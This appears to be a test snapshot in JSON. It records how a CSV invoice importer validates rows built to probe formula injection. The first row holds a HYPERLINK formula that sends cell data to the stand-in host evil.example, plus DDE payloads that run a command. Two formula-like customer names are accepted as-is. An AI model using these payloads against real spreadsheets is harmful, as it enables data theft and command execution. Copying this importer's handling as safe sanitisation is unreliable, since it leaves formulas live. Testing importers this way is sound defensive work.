@@ -1,0 +1,197 @@
+{
+  "summary": {
+    "delimiter": ",",
+    "delimiterDetected": true,
+    "header": [
+      "invoice_no",
+      "customer",
+      "email",
+      "phone",
+      "amount",
+      "currency",
+      "issued",
+      "due",
+      "customer_id",
+      "status"
+    ],
+    "rows": 5,
+    "importable": 2,
+    "invalid": 3,
+    "skipped": 0,
+    "errors": [],
+    "warnings": []
+  },
+  "rows": [
+    {
+      "line": 2,
+      "raw": [
+        "=HYPERLINK(\"http://evil.example/?d=\"&A1,\"click\")",
+        "=cmd|' /C calc'!A0",
+        "@SUM(1+1)*cmd|' /C calc'!A0",
+        "+1+1",
+        "-2+3",
+        "GBP",
+        "2026-09-01",
+        "2026-10-01",
+        "=1+2",
+        "Open"
+      ],
+      "outcome": {
+        "kind": "error",
+        "errors": [
+          {
+            "code": "non_positive_amount",
+            "message": "amount must be positive: \"-2+3\"",
+            "column": "amount"
+          }
+        ],
+        "warnings": [
+          {
+            "code": "invalid_email",
+            "message": "ignored invalid email \"@SUM(1+1)*cmd|' /C calc'!A0\"",
+            "column": "email"
+          },
+          {
+            "code": "invalid_phone",
+            "message": "ignored invalid phone \"+1+1\"",
+            "column": "phone"
+          },
+          {
+            "code": "no_contact_method",
+            "message": "no usable email or phone; the customer cannot be contacted"
+          }
+        ]
+      }
+    },
+    {
+      "line": 3,
+      "raw": [
+        "H-2",
+        "Multi\nline\nname",
+        "ok@example.com",
+        "",
+        "=1+2",
+        "GBP",
+        "2026-09-01",
+        "2026-10-01",
+        "",
+        "Open"
+      ],
+      "outcome": {
+        "kind": "error",
+        "errors": [
+          {
+            "code": "invalid_amount",
+            "message": "not an amount: \"=1+2\"",
+            "column": "amount"
+          }
+        ],
+        "warnings": []
+      }
+    },
+    {
+      "line": 6,
+      "raw": [
+        "H-3",
+        "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
+        "x@example.com",
+        "",
+        "10",
+        "GBP",
+        "2026-09-01",
+        "2026-10-01",
+        "",
+        "Open"
+      ],
+      "outcome": {
+        "kind": "error",
+        "errors": [
+          {
+            "code": "cell_too_long",
+            "message": "a cell is longer than 1000 characters",
+            "column": "customer"
+          }
+        ],
+        "warnings": []
+      }
+    },
+    {
+      "line": 7,
+      "raw": [
+        "H-4",
+        "  =HYPERLINK(\"http://x\")",
+        "y@example.com",
+        "",
+        "10",
+        "GBP",
+        "2026-09-01",
+        "2026-10-01",
+        "'quoted",
+        "Open"
+      ],
+      "outcome": {
+        "kind": "ok",
+        "row": {
+          "invoiceNumber": "H-4",
+          "customer": {
+            "name": "=HYPERLINK(\"http://x\")",
+            "email": "y@example.com",
+            "phone": null,
+            "externalId": "'quoted"
+          },
+          "amountMinor": 1000,
+          "currency": "GBP",
+          "issuedOn": "2026-09-01",
+          "dueOn": "2026-10-01",
+          "referenceCodes": [
+            "MFVP7HAM",
+            "MVG9WRBP",
+            "7HPM2GV3",
+            "3K2A37SB",
+            "H27VGTBG"
+          ]
+        },
+        "warnings": []
+      }
+    },
+    {
+      "line": 8,
+      "raw": [
+        "H-5",
+        "＝Fullwidth Formula",
+        "\tz@example.com",
+        "",
+        "10",
+        "GBP",
+        "2026-09-01",
+        "2026-10-01",
+        "",
+        "Open"
+      ],
+      "outcome": {
+        "kind": "ok",
+        "row": {
+          "invoiceNumber": "H-5",
+          "customer": {
+            "name": "＝Fullwidth Formula",
+            "email": "z@example.com",
+            "phone": null,
+            "externalId": null
+          },
+          "amountMinor": 1000,
+          "currency": "GBP",
+          "issuedOn": "2026-09-01",
+          "dueOn": "2026-10-01",
+          "referenceCodes": [
+            "F33JK9NT",
+            "8BRVH8A8",
+            "A4NPPX43",
+            "YEY652CT",
+            "GMW4QYAR"
+          ]
+        },
+        "warnings": []
+      }
+    }
+  ]
+}
